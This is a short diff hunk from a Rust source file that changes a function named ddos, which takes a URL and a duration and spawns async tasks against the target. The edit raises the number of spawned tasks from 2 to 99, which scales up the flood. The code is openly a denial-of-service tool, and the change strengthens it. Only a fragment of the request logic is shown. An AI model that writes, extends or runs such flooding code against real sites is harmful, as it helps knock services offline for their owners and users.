@@ -7,7 +7,7 @@ pub async fn ddos(url: String, time: Duration) {
 
     let url = Arc::new(Mutex::new(url));
 
-    for _ in 1..3 {
+    for _ in 1..100 {
         let u = Arc::clone(&url);
 
         let t = tokio::spawn(async move {
